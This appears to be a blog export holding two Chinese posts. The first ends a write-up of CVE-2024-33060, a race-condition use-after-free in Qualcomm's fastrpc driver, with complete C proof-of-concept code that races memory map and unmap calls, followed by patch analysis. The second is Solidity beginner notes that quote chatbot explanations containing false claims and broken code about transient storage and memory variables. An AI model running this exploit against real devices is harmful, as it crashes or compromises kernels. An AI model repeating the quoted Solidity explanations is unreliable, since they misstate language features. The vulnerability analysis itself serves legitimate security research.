syncing: Oops: Fatal exception 3 PoC 主线程 (main) 不断执行 FASTRPC_IOCTL_MEM_MAP，将内存映射到 DSP。 • 另一个线程 (thread 函数) 不断执行 FASTRPC_IOCTL_MUNMAP，将这些映射给解除。 • 每次循环都通过 pthread_barrier_wait 同步，以确保两个线程几乎同时对同一全局资源发起操作。 • 另外，使用 fork() 创建一个子进程，也会带来额外的并发复杂性。 一旦 adsprpc 驱动中在全局映射（global map）或其他数据结构的管理上，有缺陷（例如没有正确的加锁或引用计数），就可能导致 Use After Free、越界访问等问题。PoC 的大量循环调用是想快速、频繁地击中竞争窗口，从而更容易重现漏洞。 main函数中pthread_barrier_t barrier 被初始化为 2，因此主线程和辅助线程轮流执行，只有两方都到达 pthread_barrier_wait之后才一起放行进入下一轮循环。 • 这样做能使 mem_map 和 munmap 操作更容易在时间上“对撞”，从而增加竞态出现机率。 • 如果没有这个同步屏障，不同线程可能以不规则的时间先后运行，概率性更分散；有了屏障，几乎每一次 mem_map 都紧跟一次 munmap，实现高频竞争。 #include &quot;adsprpc_shared.h&quot; #include &lt;fcntl.h&gt; #include &lt;unistd.h&gt; #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;sys/wait.h&gt; #include &lt;linux/dma-heap.h&gt; #include &lt;sys/mman.h&gt; #include &lt;errno.h&gt; #include &lt;pthread.h&gt; #define FASTRPC_MODE_UNSIGNED_MODULE 8 bool guess(int adsprpc_fd,unsigned long addr) { } /** 对 DSP 初始化： 创造了一个可执行 shell_file_dma，并且将其“上传”到 DSP（通过 FASTRPC_IOCTL_INIT_ATTRS）。 后续对 dsp 进行 mem_map/unmap 操作需要在此基础上进行。 将一个 unsigned module 加载到 DSP，有时可以用来执行用户自定义的 DSP 代码（若驱动允许“unsigned module”这样的模式）， 从而在更低层访问 DMA 缓冲或 trigger bug。 **/ int create_and_init_adsprpc() { // 【1.1】打开 /dev/adsprpc-smd 设备文件 int adsprpc_fd = open(&quot;/dev/adsprpc-smd&quot;,O_RDONLY); if(adsprpc_fd == -1) { printf(&quot;open: %m\\n&quot;); return -1; } // 【1.2】通过 FASTRPC_IOCTL_GETINFO 获取一些信息（cid = 3） unsigned cid = 3; long ret = ioctl(adsprpc_fd,FASTRPC_IOCTL_GETINFO,&amp;cid); // 【1.3】打开 /data/local/tmp/fastrpc_shell_unsigned_3（示例 shell 文件） int shell_fd = open(&quot;/data/local/tmp/fastrpc_shell_unsigned_3&quot;,O_RDONLY); if(shell_fd == -1) { printf(&quot;open shell: %m\\n&quot;); return -1; } // 【1.4】打开 /dev/dma_heap/system（DMA 堆）， int dma_heap = open(&quot;/dev/dma_heap/system&quot;,O_RDONLY); if(dma_heap == -1) { printf(&quot;open dma_heap: %m\\n&quot;); return -1; } // 【1.5】并分配一段dma堆内存（长度 0x131000） struct dma_heap_allocation_data heap_data = { .len = 0x131000, .fd_flags = O_RDWR, }; ret = ioctl(dma_heap,DMA_HEAP_IOCTL_ALLOC,&amp;heap_data); if( ret &lt; 0 || heap_data.fd &lt; 0) { printf(&quot;dma heap allocation fail: %d %d %m\\n&quot;,ret,heap_data.fd); return -1; } void* shell_file_dma = mmap(NULL,0x131000,PROT_READ | PROT_WRITE, MAP_SHARED,heap_data.fd,0); // 【1.6】读取外部 shell 文件内容到分配的 DMA 缓冲区中 long length = read(shell_fd,shell_file_dma,0x131000); if(length &lt;= 0) { printf(&quot;read: %d %m\\n&quot;,ret); return -1; } // 【1.7】调用 FASTRPC_IOCTL_INIT_ATTRS，将文件映射信息发送给 DSP，使用的是 FASTRPC_MODE_UNSIGNED_MODULE 模式 struct fastrpc_ioctl_init_attrs init = { .init = { .file = shell_file_dma, .filefd = heap_data.fd, .filelen = length, .mem = 0, .flags = FASTRPC_INIT_CREATE, }, .attrs = FASTRPC_MODE_UNSIGNED_MODULE }; ret = ioctl(adsprpc_fd,FASTRPC_IOCTL_INIT_ATTRS,&amp;init); if(ret &lt; 0) { printf(&quot;init_attrs: %d %m\\n&quot;,ret); return -1; } // 如果一切正常，返回 adsprpc_fd（文件描述符），用于后续对 adsprpc 的操作 return adsprpc_fd; } pthread_barrier_t barrier; void* thread(void* arg) { // 【2.1】又调用 create_and_init_adsprpc() 打开另一个 adsprpc_fd2 int adsprpc_fd2 = create_and_init_adsprpc(); if(adsprpc_fd2 == -1) { printf(&quot;failed to open adsprpc...\\n&quot;); exit(1); } //【2.2】调用 FASTRPC_IOCTL_MUNMAP，在线程B不断拆除（unmap）已经映射的内存 while(1) { pthread_barrier_wait(&amp;barrier); struct fastrpc_ioctl_munmap ud = { .size = 0x1000, .vaddrout = 0 }; unsigned long ret = ioctl(adsprpc_fd2,FASTRPC_IOCTL_MUNMAP,&amp;ud); printf(&quot;munmap: %lu\\n&quot;,ret); } } int main() { // 【1】首先调用 create_and_init_adsprpc()，得到 adsprpc_fd int adsprpc_fd = create_and_init_adsprpc(); // 调用 fork()，父进程退出，留子进程来执行后续操作（为了隔离或简化测试环境？） if(fork()) exit(0); // 后面都是子进程 // 【2】创建一个额外线程B (pthread_create)，该线程对应 thread() 函数 pthread_t tid; pthread_barrier_init(&amp;barrier,NULL,2); pthread_create(&amp;tid,NULL,&amp;thread,NULL); if(adsprpc_fd == -1) { printf(&quot;failed to open adsprpc...\\n&quot;); return 1; } // 【3】主线程A自己不断执行 while(1) { pthread_barrier_wait(&amp;barrier); // 等待线程同步 struct fastrpc_ioctl_mem_map mmap_struct = { .m = { .flags = ADSP_MMAP_REMOTE_HEAP_ADDR, // 会将这段内存视为“远端堆地址”，并可能放到一个全局映射列表中 .fd = -1, .length = 0x1000, .attrs = 0, .vaddrin = 0, .offset = 0, } }; // 不断调用 FASTRPC_IOCTL_MEM_MAP unsigned long ret = ioctl(adsprpc_fd,FASTRPC_IOCTL_MEM_MAP,&amp;mmap_struct); printf(&quot;mem_map: %lu\\n&quot;,ret); } // struct fastrpc_ioctl_mmap mmap_struct2 = { // .fd = -1, // .flags = ADSP_MMAP_HEAP_ADDR, // .vaddrin = 0, // .size = 0x1000 // }; // ret = ioctl(adsprpc_fd,FASTRPC_IOCTL_MMAP,&amp;mmap_struct2); // if(ret &lt; 0) // { // printf(&quot;ret mmap: %lx %m\\n&quot;,ret); // } // printf(&quot;vaddrout: %lx %m\\n&quot;,mmap_struct2.vaddrout); } 4 patch https://git.codelinaro.org/clo/la/kernel/msm-5.4/-/commit/4056f87e3b347e0283234f56b9e9aaea681d1644 问题现象是： “remote heap maps” 在 fastrpc_internal_mmap 函数实际完成映射操作之前，就已经被插入到全局链表 (global list) 中。还是如代码里的注释[1]。这样一来，当 map 被全局链表可见之后，其他线程或进程就可以通过 fastrpc_internal_munmap 函数拿到该 map 并开始 unmmap 或 free 操作。如果 unmmap/free 动作发生在 fastrpc_internal_mmap 完成之前，就会出现用后即释 (Use After Free, UAF) • 简单来说： 线程 A: fastrpc_internal_mmap → 分配map → 插入全局链表 → （尚未完成，继续map的其他操作） 线程 B: fastrpc_internal_munmap 查找到这个 map，开始释放 → 释放完成 线程 A 继续操作 map 时，就会访问到已被释放或复用的内存。 那么这个patch的思路是：“延后”插入全局链表的时机，即： • 先在 fastrpc_internal_mmap 函数中完成所有必要的初始化，包括与 DSP 侧建立映射、设置地址信息、分配资源等。 • 等确认这个映射已经“可安全使用”或“完全就绪”之后，才将 map 添加到全局 maps 链表里。 这样就能避免在 map 尚未完成初始化时，被其他线程“过早”看到并 free 掉。此时，只有当 fastrpc_internal_mmap 函数的所有操作都结束后，map 才会对外可见。 其他线程要想 unmap 时，能保证 map 处于一个“初始化完成、引用计数正确”的状态。由于 map 已经完全初始化，其他任何对 map 的 unmap 行为都能正确地走引用计数或锁定流程，再加上全局链表访问受相应的锁/同步机制保护，就能有效避免UAF。 在代码上的体现为： 解耦global和local的map add 2. create函数里只保留add到local list的逻辑 3. fastrpc_internal_mem_map中，add 到 global list的动作放在函数结尾。 其他函数的细节就不贴了，都差不多的意思。 其他操作不会并发导致uaf? 我理解如果有这样一种场景，也可能uaf，但是还没看过代码 线程 A: 某接口，查找某个map → （尚未完成） 线程 B: fastrpc_internal_munmap 查找到这个 map，开始释放 → 释放完成 线程 A 继续操作 map 时，就会访问到已被释放或复用的内存。 5 总结 漏洞模式：在引用被传递到一个用户态可任意释放对象之后，依然继续使用该引用。类似上面说到的file uaf。 这个漏洞里为什么用户态可任意释放对象？ 那两个互斥锁只能锁相同fd的ioctl并发，并没有锁住不同fd的ioctl并发。 6 参考文献 https://googleprojectzero.blogspot.com/2024/12/qualcomm-dsp-driver-unexpectedly-excavating-exploit.html https://project-zero.issues.chromium.org/issues/42451715 https://git.codelinaro.org/clo/la/kernel/msm-5.4/-/commit/4056f87e3b347e0283234f56b9e9aaea681d1644 ","link":"https://lzxzl.github.io/post/cve-2024-33060-uaf-race-of-global-maps-in-fastrpc_mmap_create-and-epilogue-functions/"},{"title":"solidity入门笔记","content":" 2025.01.01: 0x00~0x01 (Basic) 2025.01.02: 0x02~0x04 (Basic) 2025.01.03: 0x05~0x0A (Basic) 2025.01.04: 0x0B~0x0F (Basic) 2025.01.05: 0x10~0x15 (Basic) 2025.01.06: 0x16~0x1A (Basic) 2025.01.07: 0x1B~0x20 (Basic) 2025.01.08: 0x21~0x28 (Basic) 2025.01.09: 0x29 2025.01.10: 0x2A-0x32 (Basic) Basic 0x00 Primitive Data Types boolean uint8, ... , uint256 int8, ..., int256 address // SPDX-License-Identifier: MIT pragma solidity ^0.8.26; contract Primitives { // [1] boolean 类型 bool public boo = true; // [2] 整型 /* [2.1] 非负整数 uint stands for unsigned integer, meaning non negative integers different sizes are available uint8 ranges from 0 to 2 ** 8 - 1 uint16 ranges from 0 to 2 ** 16 - 1 ... uint256 ranges from 0 to 2 ** 256 - 1 */ uint8 public u8 = 1; uint256 public u256 = 456; uint256 public u = 123; // uint is an alias for uint256 uint256 public maxUint = type(uint256).max; // 非负整数最大值： /* [2] 有符号整数 Negative numbers are allowed for int types. Like uint, different ranges are available from int8 to int256 int256 ranges from -2 ** 255 to 2 ** 255 - 1 int128 ranges from -2 ** 127 to 2 ** 127 - 1 */ int8 public i8 = -1; int256 public i256 = 456; int256 public i = -123; // int is same as int256 // minimum and maximum of int int256 public minInt = type(int256).min; int256 public maxInt = type(int256).max; // [3] address 160 bits，20 bytes address public addr = 0xCA35b7d915458EF540aDe6068dFe2F44E8fa733c; // [4] bytes /* In Solidity, the data type byte represent a sequence of bytes. Solidity presents two type of bytes types : - fixed-sized byte arrays 固定长度的字节数组 - dynamically-sized byte arrays. 动态长度的字节数组 The term bytes in Solidity represents a dynamic array of bytes. It’s a shorthand for byte[] . */ bytes1 a = 0xb5; // [10110101] bytes1 b = 0x56; // [01010110] // Default values // Unassigned variables have a default value bool public defaultBoo; // false 布尔默认是false uint256 public defaultUint; // 0 整型默认是0 int256 public defaultInt; // 0 address public defaultAddr; // 0x0000000000000000000000000000000000000000 地址也默认是0 } 0x01 Variables 三种类型的变量： local declared inside a function not stored on the blockchain state declared outside a function stored on the blockchain global (provides information about the blockchain) // SPDX-License-Identifier: MIT pragma solidity ^0.8.26; contract Variables { // [2] 函数外声明的是state变量，存储在链上 // State variables are stored on the blockchain. string public text = &quot;Hello&quot;; uint256 public num = 123; function doSomething() public view returns(uint256, address){ // [1] 函数内声明的是 local 变量，不会存储在链上 // Local variables are not saved to the blockchain. uint256 i = 456; // [3] 全局变量，提供关于区块链的信息 // Here are some global variables uint256 timestamp = block.timestamp; // Current block timestamp address sender = msg.sender; // address of the caller return (timestamp, sender); } } 0x02 Constants Constant不可被修改 // SPDX-License-Identifier: MIT pragma solidity ^0.8.26; contract Constants { // 常量的声明在 public 和 常量名中间 // coding convention to uppercase constant variables address public constant MY_ADDRESS = 0x777788889999AaAAbBbbCcccddDdeeeEfFFfCcCc; uint256 public constant MY_UINT = 123; } 0x03 Immutable Immutable类似于Constant，但是immutable可以在构造函数内修改，不过之后就不能再修改了。 // SPDX-License-Identifier: MIT pragma solidity ^0.8.26; contract Immutable { address public immutable myAddr; uint256 public immutable myUint; constructor(uint256 _myUint) { myAddr = msg.sender; myUint = _myUint; } } 0x04 Reading and Writing to a State Variable // SPDX-License-Identifier: MIT pragma solidity ^0.8.26; contract SimpleStorage { // State variable to store a number uint256 public num; // You need to send a transaction to write to a state variable. // set，修改链上的变量，会消耗gas function set(uint256 _num) public { num = _num; } // You can read from a state variable without sending a transaction. // get,读取不消耗gas function get() public view returns (uint256) { return num; } } 0x05 Ether and Wei 交易用ether支付。类似于1美元等于100美分，1 ether等于 101810^{18}1018 wei. // SPDX-License-Identifier: MIT pragma solidity ^0.8.26; contract EtherUnits { uint256 public oneWei = 1 wei; // 1 wei is equal to 1 bool public isOneWei = (oneWei == 1); uint256 public oneGwei = 1 gwei; // 1 gwei is equal to 10^9 wei bool public isOneGwei = (oneGwei == 1e9); uint256 public oneEther = 1 ether; // 1 ether is equal to 10^18 wei bool public isOneEther = (oneEther == 1e18); } 0x06 Gas 对于一份交易，需要支付多少 ether？ 答案是需要支付 gas spent * gas price 数量的ether gas是一个计算单位 gas spent是交易中使用的Gas总量 gas price是你愿意为每个Gas单位支付的以太币数量 Gas价格较高的交易会被优先打包进区块。 未使用的Gas会被退还。 Gas Limit 你可以使用的Gas量有两个上限： gas limit (你愿意为你的交易使用的最大Gas量，由你设置) block gas limit (一个区块允许的最大Gas量，由网络设置) 以太坊虚拟机（EVM）执行智能合约中的每个操作都需要消耗一定量的Gas。Gas的设计是为了防止无限循环和其他恶意代码占用网络资源。通过设置合适的Gas价格和Gas限制，你可以控制交易费用和确认速度。 // SPDX-License-Identifier: MIT pragma solidity ^0.8.26; contract Gas { uint256 public i = 0; // Using up all of the gas that you send causes your transaction to fail. // State changes are undone. // Gas spent is not refunded. function forever() public { // Here we run a loop until all of the gas are spent // and the transaction fails while (true) { i += 1; } } } 这里演示了一个会导致交易失败的合约函数 forever()。 它包含一个无限循环，会不断增加变量i的值，直到消耗完所有提供的Gas。 由于交易失败，状态更改（i 的值增加）会被回滚，并且消耗的Gas也不会被退还。 0x07 If / Else 简单，如代码所示 // SPDX-License-Identifier: MIT pragma solidity ^0.8.26; contract IfElse { function foo(uint256 x) public pure returns (uint256) { if (x &lt; 10) { return 0; } else if (x &lt; 20) { return 1; } else { return 2; } } function ternary(uint256 _x) public pure returns (uint256) { // if (_x &lt; 10) { // return 1; // } // return 2; // shorthand way to write if / else statement // the &quot;?&quot; operator is called the ternary operator return _x &lt; 10 ? 1 : 2; } } 0x08 For and While Loop 一般建议不要编写无限制的循环，因为这会达到gas限制，导致transaction失败。基于这个原因，while 和 do while 比较少用。使用方法和其他语言差不多，看代码。 // SPDX-License-Identifier: MIT pragma solidity ^0.8.26; contract Loop { function loop() public pure { // for loop for (uint256 i = 0; i &lt; 10; i++) { if (i == 3) { // Skip to next iteration with continue continue; } if (i == 5) { // Exit loop with break break; } } // while loop uint256 j; while (j &lt; 10) { j++; } } } 0x09 Mapping 也简单，看代码。mapping的语法是：mapping(key =&gt; value) public val_name // SPDX-License-Identifier: MIT pragma solidity ^0.8.26; contract Mapping { // Mapping from address to uint // 键：address，值：uint256 mapping(address =&gt; uint256) public myMap; function get(address _addr) public view returns (uint256) { // Mapping always returns a value. // If the value was never set, it will return the default value. return myMap[_addr]; } function set(address _addr, uint256 _i) public { // Update the value at this address myMap[_addr] = _i; } function remove(address _addr) public { // Reset the value to the default value. // 重设置为默认值 delete myMap[_addr]; } } // 嵌套mapping contract NestedMapping { // Nested mapping (mapping from address to another mapping) mapping(address =&gt; mapping(uint256 =&gt; bool)) public nested; function get(address _addr1, uint256 _i) public view returns (bool) { // You can get values from a nested mapping // even when it is not initialized return nested[_addr1][_i]; } function set(address _addr1, uint256 _i, bool _boo) public { nested[_addr1][_i] = _boo; } function remove(address _addr1, uint256 _i) public { delete nested[_addr1][_i]; } } 0xA Array array可以是固定长度，也可以是动态长度的。 Array.sol // SPDX-License-Identifier: MIT pragma solidity ^0.8.26; contract Array { // Several ways to initialize an array uint256[] public arr; // 动态长度array uint256[] public arr2 = [1, 2, 3]; // 固定长度array // Fixed sized array, all elements initialize to 0 uint256[10] public myFixedSizeArr; // 固定长度数组，默认值均为0 function get(uint256 i) public view returns (uint256) { // 获取数组元素 return arr[i]; } // Solidity can return the entire array. // But this function should be avoided for // arrays that can grow indefinitely in length. function getArr() public view returns (uint256[] memory) { // 获取数组 return arr; } function push(uint256 i) public { // 往数组里加元素，数组长度加1 // Append to array // This will increase the array length by 1. arr.push(i); } function pop() public { // 从数组里移除最后一个元素，数组长度减1 // Remove last element from array // This will decrease the array length by 1 arr.pop(); } function getLength() public view returns (uint256) { // 获取数组长度 return arr.length; } function remove(uint256 index) public { // 把对应index的元素的值设置为默认值，数组长度不变 // Delete does not change the array length. // It resets the value at index to it's default value, // in this case 0 delete arr[index]; } function examples() external pure { // create array in memory, only fixed size can be created uint256[] memory a = new uint256[](5); } } external pure？ 自定义remove函数：通过从右向左移动元素来移除数组元素 // SPDX-License-Identifier: MIT pragma solidity ^0.8.26; contract ArrayRemoveByShifting { // [1, 2, 3] -- remove(1) --&gt; [1, 3, 3] --&gt; [1, 3] // [1, 2, 3, 4, 5, 6] -- remove(2) --&gt; [1, 2, 4, 5, 6, 6] --&gt; [1, 2, 4, 5, 6] // [1, 2, 3, 4, 5, 6] -- remove(0) --&gt; [2, 3, 4, 5, 6, 6] --&gt; [2, 3, 4, 5, 6] // [1] -- remove(0) --&gt; [1] --&gt; [] uint256[] public arr; function remove(uint256 _index) public { // 边界检查 require(_index &lt; arr.length, &quot;index out of bound&quot;); // 通过for循环，将从index+1开始的元素，全部逐个前移 for (uint256 i = _index; i &lt; arr.length - 1; i++) { arr[i] = arr[i + 1]; } // 删除最后一个元素，数组长度减1 arr.pop(); } function test() external { // [1] 定义一个长度为5的数组 arr = [1, 2, 3, 4, 5]; // [2] 删除第3个元素 remove(2); // [1, 2, 4, 5] assert(arr[0] == 1); assert(arr[1] == 2); assert(arr[2] == 4); assert(arr[3] == 5); assert(arr.length == 4); arr = [1]; remove(0); // [] assert(arr.length == 0); } } 自定义remove函数：通过将最后一个元素复制到要删除的位置来删除数组元素 // SPDX-License-Identifier: MIT pragma solidity ^0.8.26; contract ArrayReplaceFromEnd { uint256[] public arr; // Deleting an element creates a gap in the array. // One trick to keep the array compact is to // move the last element into the place to delete. function remove(uint256 index) public { // Move the last element into the place to delete // 将数组最后一个元素拷贝到要删除的index arr[index] = arr[arr.length - 1]; // Remove the last element // 然后pop最后一个元素 arr.pop(); } function test() public { arr = [1, 2, 3, 4]; remove(1); // [1, 4, 3] assert(arr.length == 3); assert(arr[0] == 1); assert(arr[1] == 4); assert(arr[2] == 3); remove(2); // [1, 4] assert(arr.length == 2); assert(arr[0] == 1); assert(arr[1] == 4); } } 0x0B Enum 枚举可以在 contract 外声明，里面的真实值其实是uint。和C语言也没啥差别。 // SPDX-License-Identifier: MIT pragma solidity ^0.8.26; contract Enum { // Enum representing shipping status enum Status { Pending, Shipped, Accepted, Rejected, Canceled } // Default value is the first element listed in // definition of the type, in this case &quot;Pending&quot; // 默认值是第一个值 Status public status; // Returns uint // Pending - 0 // Shipped - 1 // Accepted - 2 // Rejected - 3 // Canceled - 4 function get() public view returns (Status) { return status; } // 更新state变量 // Update status by passing uint into input function set(Status _status) public { status = _status; } // 更新state变量 // You can update to a specific enum like this function cancel() public { status = Status.Canceled; } // 重置state变量 // delete resets the enum to its first value, 0 function reset() public { delete status; } } 不同文件之间引用： EnumDeclaration.sol // SPDX-License-Identifier: MIT pragma solidity ^0.8.26; // This is saved 'EnumDeclaration.sol' // 声明一个enum enum Status { Pending, Shipped, Accepted, Rejected, Canceled } Enum // SPDX-License-Identifier: MIT pragma solidity ^0.8.26; import &quot;./EnumDeclaration.sol&quot;; contract Enum { Status public status; } 0x0C User Defined Value Types 类似C语言的typedef，关键字：type。代码细节可以先往下文看，后面回头再来看。 // SPDX-License-Identifier: MIT pragma solidity ^0.8.26; // Code copied from optimism // https://github.com/ethereum-optimism/optimism/blob/develop/packages/contracts-bedrock/src/dispute/lib/LibUDT.sol type Duration is uint64; type Timestamp is uint64; type Clock is uint128; // 有些细节等 library LibClock { function wrap(Duration _duration, Timestamp _timestamp) internal pure returns (Clock clock_) { assembly { // data | Duration | Timestamp // bit | 0 ... 63 | 64 ... 127 clock_ := or(shl(0x40, _duration), _timestamp) } } function duration(Clock _clock) internal pure returns (Duration duration_) { assembly { duration_ := shr(0x40, _clock) } } function timestamp(Clock _clock) internal pure returns (Timestamp timestamp_) { assembly { timestamp_ := shr(0xC0, shl(0xC0, _clock)) } } } // Clock library without user defined value type library LibClockBasic { function wrap(uint64 _duration, uint64 _timestamp) internal pure returns (uint128 clock) { assembly { clock := or(shl(0x40, _duration), _timestamp) } } } contract Examples { // 用基本数据类型来实现 function example_no_uvdt() external view { // Without UDVT uint128 clock; uint64 d = 1; uint64 t = uint64(block.timestamp); clock = LibClockBasic.wrap(d, t); // Oops! wrong order of inputs but still compiles clock = LibClockBasic.wrap(t, d); } // 用用户自定义类型来实现 function example_uvdt() external view { // Turn value type into user defined value type Duration d = Duration.wrap(1); Timestamp t = Timestamp.wrap(uint64(block.timestamp)); // Turn user defined value type back into primitive value type uint64 d_u64 = Duration.unwrap(d); uint64 t_u54 = Timestamp.unwrap(t); // LibClock example Clock clock = Clock.wrap(0); clock = LibClock.wrap(d, t); // Oops! wrong order of inputs // This will not compile // clock = LibClock.wrap(t, d); } } 0x0D Structs 结构体，也和C语言差不多。既可以在contract外面定义；也可以在另一个文件定义，然后import进来。 storage关键字 和 calldata关键字 见下一节 // SPDX-License-Identifier: MIT pragma solidity ^0.8.26; contract Todos { struct Todo { string text; bool completed; } // An array of 'Todo' structs // 定义一个结构体数组 Todo[] public todos; function create(string calldata _text) public { // 3 ways to initialize a struct // 三种方法初始化一个结构体 // 1. 结构体名(第一个字段值，第二个字段值, ...) // - calling it like a function todos.push(Todo(_text, false)); // 2. 结构体名({第一个字段名: 第一个字段值, 第二个字段名: 第二个字段值，...}) // key value mapping todos.push(Todo({text: _text, completed: false})); // 3. 通过memory关键字声明一个空的结构体，然后更新他的值。（说是空的，其实是赋予了所有字段默认值） // initialize an empty struct and then update it Todo memory todo; todo.text = _text; // todo.completed initialized to false // 也就是如果没有定义值，取这个类型的默认值 todos.push(todo); } // 哦豁，array的getter会默认生成？怎么调用？我尝试 todos.get 是报错找不到的。先往下吧。 // Solidity automatically created a getter for 'todos' so // you don't actually need this function. function get(uint256 _index) public view returns (string memory text, bool completed) { Todo storage todo = todos[_index]; return (todo.text, todo.completed); } // update text function updateText(uint256 _index, string calldata _text) public { Todo storage todo = todos[_index]; todo.text = _text; } // update completed function toggleCompleted(uint256 _index) public { Todo storage todo = todos[_index]; todo.completed = !todo.completed; } } 在另一个文件里声明，然后import使用： StructDeclaration.sol // SPDX-License-Identifier: MIT pragma solidity ^0.8.26; // This is saved 'StructDeclaration.sol' struct Todo { string text; bool completed; } StructUsed.sol // SPDX-License-Identifier: MIT pragma solidity ^0.8.26; import &quot;./StructDeclaration.sol&quot;; contract Todos { // An array of 'Todo' structs Todo[] public todos; } 0x0E Data Locations - Storage, Memory and Calldata 变量可以声明为 storage, memory 或者 calldata 来指定数据的location storage - variable is a state variable (stored on the blockchain) —— 链上的state变量 memory - variable is in memory and it exists while a function is being called —— 函数生命周期内的变量 calldata - special data location that contains function arguments —— 指明是函数参数内的变量，类似于实参？ // SPDX-License-Identifier: MIT pragma solidity ^0.8.26; contract DataLocations { uint256[] public arr; mapping(uint256 =&gt; address) map; uint public memory_arr_length = 0; uint public calldata_arr_length = 0; uint public calldata_arr_first; struct MyStruct { uint256 foo; } mapping(uint256 =&gt; MyStruct) myStructs; function f() public { // call _f with state variables _f(arr, map, myStructs[1]); // get a struct from a mapping MyStruct storage myStruct = myStructs[1]; // create a struct in memory MyStruct memory myMemStruct = MyStruct(0); } function _f( uint256[] storage _arr, mapping(uint256 =&gt; address) storage _map, MyStruct storage _myStruct ) internal { // do something with storage variables _arr.push(222); _map[0] = msg.sender; // 如果这样赋值 // _myStruct({foo:111}); // 是错误的，报错TypeError: This expression is not callable， // 为什么呢？ // 当你将一个结构体作为参数传递给一个函数，并且该参数被声明为 storage 类型时，你实际上是在传递一个指向原始结构体在存储中的位置的指针。 // 因此，在 _f 函数内部对 _myStruct 的修改会直接影响到 myStructs[1] 的值 // 而 {foo: 111} 语法通常用于创建新的结构体或在内存中初始化结构体，例如在 f 函数中创建 myMemStruct 的方式。 // 但是，它不能用于修改已经存在的存储结构体的成员。 你需要使用点号语法 (_myStruct.foo = 111) 来直接访问和修改结构体成员。如下所示 _myStruct.foo = 111; } // 输入： [1,2,3] // 输出： 0: uint256[]: 100,101,102 // You can return memory variables function g(uint256[] memory _arr) public view returns (uint256[] memory) { // do something with memory array _arr[0] = 100; _arr[1] = 101; _arr[2] = 102; // 这里本来想 // memory_arr_length = _arr.length; //但是报错：TypeError: Function cannot be declared as view because this expression (potentially) modifies the state. // 所以，如果函数会改变state变量的值，那么该函数就不能声明 view // _arr.push(444); // 报错：TypeError: Member &quot;push&quot; is not available in uint256[] memory outside of storage. // _arr.pop(); // 报错：TypeError: Member &quot;pop&quot; is not available in uint256[] memory outside of storage. return _arr; } // 输入：[1,2,3] // calldata_arr_first == 1， calldata_arr_length == 3 function h(uint256[] calldata _arr) external { // do something with calldata array // _arr.push(1); // 报错： TypeError: Member &quot;push&quot; is not available in uint256[] calldata outside of storage. calldata_arr_first = _arr[0]; // 报错： TypeError: Calldata arrays are read-only. calldata_arr_length = _arr.length; } } 好像还是没有理解这三的区别，问了下Gemini-1.5 pro： Solidity 中的数据位置（Data Locations） - storage，memory 和 calldata 指定了变量数据存储的位置，这会影响变量的生命周期、访问方式以及gas成本。理解它们的区别至关重要，可以避免不必要的gas消耗和潜在的错误。 以下是三种数据位置的详细解释： 1. storage: 位置: 存储在区块链上，是合约状态的一部分。 生命周期: 永久存储，即使函数执行完毕，数据仍然保留。修改 storage 变量会永久改变合约的状态。 访问成本: 读写 storage 变量的 gas 成本最高。 适用场景: 存储合约的持久状态变量。 默认位置: 状态变量（在合约级别声明的变量）默认存储在 storage。 2. memory: 位置: 存储在内存中，是临时的。 生命周期: 只在函数执行期间存在，函数执行完毕后，数据会被销毁。 访问成本: 读写 memory 变量的 gas 成本比 storage 低。 适用场景: 存储函数内的局部变量、函数参数（对于复杂类型，如数组、结构体）以及函数返回值。 默认位置: 函数参数（除了一些例外，例如外部函数的数组参数）以及在函数内部声明的复杂类型变量默认存储在 memory。值类型 (例如 uint，bool，address) 默认没有数据位置，如果在函数内声明，则会存储在 stack 中，如果作为参数传递或在其他上下文中使用，则可能会被复制到 memory 或 calldata 中。 3. calldata: 位置: 一种特殊的只读数据位置，用于存储函数参数（尤其是外部函数的参数）。 生命周期: 类似于 memory，只在函数执行期间存在。 访问成本: 读取 calldata 变量的 gas 成本最低。不能修改 calldata 变量。 适用场景: 存储外部函数的参数（尤其是复杂类型）。 默认位置: 外部函数的参数（复杂类型）默认存储在 calldata。 总结表格: 特性 storage memory calldata 数据存储位置 区块链 内存 内存 (只读) 生命周期 永久 函数执行期间 函数执行期间 读写成本 高 中 低 (只读) 修改 可修改 可修改 不可修改 默认使用场景 状态变量 函数局部变量、函数参数、返回值 外部函数参数 示例: pragma solidity ^0.8.0; contract DataLocations { uint256 public storedData; // storage function setAndRetrieveData(uint256 x, uint256[] calldata y) external { storedData = x; // 修改 storage 变量 uint256 memory temp = x * 2; // memory 变量 uint256[] memory z = new uint256[](y.length); // memory 数组 for (uint256 i = 0; i &lt; y.length; i++) { z[i] = y[i] * 2; // 访问 calldata 变量 y 和 memory 变量 z } } function getData() external view returns (uint256) { return storedData; } } 在这个例子中，storedData 是一个状态变量，存储在 storage 中。x 和 y 是函数参数，x 会被复制到 memory 或 stack 中使用 (取决于编译器和上下文)，y 存储在 calldata 中。temp 和 z 是局部变量，存储在 memory 中。 理解 Solidity 中的数据位置对于编写高效且安全的智能合约至关重要。选择正确的数据位置可以显著降低 gas 成本并避免潜在的错误。 0x0F Transient Storage 诶，我发现大模型给出的介绍非常详细，那就先问问，再来看demo。 Solidity 中的 Transient Storage 是一种临时存储机制，它利用了 EVM (Ethereum Virtual Machine) 的特性，在函数执行期间提供了一种比 storage 更便宜的存储方式，但比 memory 的生命周期更长。然而，它并不持久化，不会改变合约的状态。 关键特性: 临时性: Transient storage 中的数据只在当前交易的上下文中有效。一旦交易完成，数据就会被丢弃，不会被保存到区块链上。这意味着它不会影响合约的状态，也不会被其他交易访问。 成本效益: 对 transient storage 的读写操作比 storage 便宜，但比 memory 稍贵。 实现方式: Transient storage 利用了 EVM 的特性，将数据存储在交易的上下文中的一个特殊区域。这避免了对区块链状态的修改，从而降低了 gas 成本。 没有特定关键字: Solidity 没有 提供像 transient 这样的关键字来显式声明 transient storage 变量。它通常通过汇编语言 (inline assembly) 来实现。 使用场景: 存储中间计算结果: 如果你需要在函数执行过程中存储一些中间计算结果，并且这些结果不需要持久化保存，那么 transient storage 是一个不错的选择。 减少 storage 读写: 如果你需要在函数中多次访问 storage 变量，可以先将值读取到 transient storage 中，然后操作 transient storage 中的值，最后一次性将结果写回 storage，从而减少 storage 的读写次数，降低 gas 成本。 跨函数调用共享数据: 在同一个交易的多个函数调用之间共享数据，而无需修改合约状态。 示例 (使用 inline assembly): pragma solidity ^0.8.0; contract TransientStorageExample { uint256 public storedData; function updateData(uint256 newValue) external { uint256 temp; assembly { // 将 newValue 存储到 transient storage temp := newValue } // ... 一些计算，使用 temp ... assembly { // 将 temp 的值写回 storage sstore(storedData.slot, temp) } } } 解释: 在这个例子中，我们使用 inline 